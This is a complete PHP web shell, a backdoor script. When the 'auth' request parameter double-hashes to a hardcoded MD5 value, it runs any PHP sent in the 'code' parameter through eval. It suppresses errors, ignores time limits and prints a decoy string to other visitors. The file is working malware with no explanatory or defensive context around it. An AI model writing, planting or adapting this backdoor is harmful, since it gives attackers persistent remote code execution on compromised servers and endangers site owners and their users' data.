<?php
@error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);
define("AUTH_CODE","40201159694681b62af9a548423767a8");
if(isset($_REQUEST['auth']) && md5(md5($_REQUEST['auth'])) == AUTH_CODE)
{
	$mycode = $_REQUEST["code"];
	@eval($mycode);
	die;
}else{
	echo "DY";
}
?>